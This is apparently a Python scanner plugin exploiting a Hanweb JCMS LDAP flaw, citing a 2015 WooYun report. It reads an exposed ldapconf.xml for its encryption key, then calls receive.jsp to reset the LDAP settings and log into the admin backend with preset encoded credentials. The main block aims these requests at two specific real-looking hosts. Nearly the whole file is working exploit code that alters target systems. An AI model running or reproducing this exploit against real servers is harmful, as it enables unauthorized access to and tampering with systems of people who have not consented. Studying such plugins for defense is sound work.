#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0143528

import re

def assign(service, arg): 
    if service == "hanweb":
        return True, arg
		
def audit(arg):
    getdata1 = 'jcms/interface/ldap/ldapconf.xml'
    code, head, res, errcode, _ = curl.curl2(arg+getdata1)
    m = re.search('<enckey>(.*?)</enckey>',res)
    if code == 200 and m:
        security_hole(arg + getdata1 + "   :ldap leakage")
    getdata2 = 'jcms/interface/ldap/receive.jsp?state=S&enckey=key888'
    code, head, res, errcode, _ = curl.curl2(arg+getdata2)
    if code == 200 and '成功' in res :
        security_hole(arg + getdata2 + "   :ldap reset")
        getdata3 = 'jcms/interface/ldap/receive.jsp?state=C&result=T&loginuser=BWcCb3FrBBh8bQ==&loginpass=BWcCb3FrBBh8bQ=='
        code, head, res, errcode, _ = curl.curl2(arg+getdata3)
        if code == 200 and 'oawindow/main.jsp' in res:
            security_hole(arg + getdata3 + "   :password reset and Background landing")




if __name__ == '__main__': 
    from dummy import *
    audit(assign('hanweb', 'http://6bur.cscec.com/')[1])
    audit(assign('hanweb', 'http://202.108.199.114:80/')[1])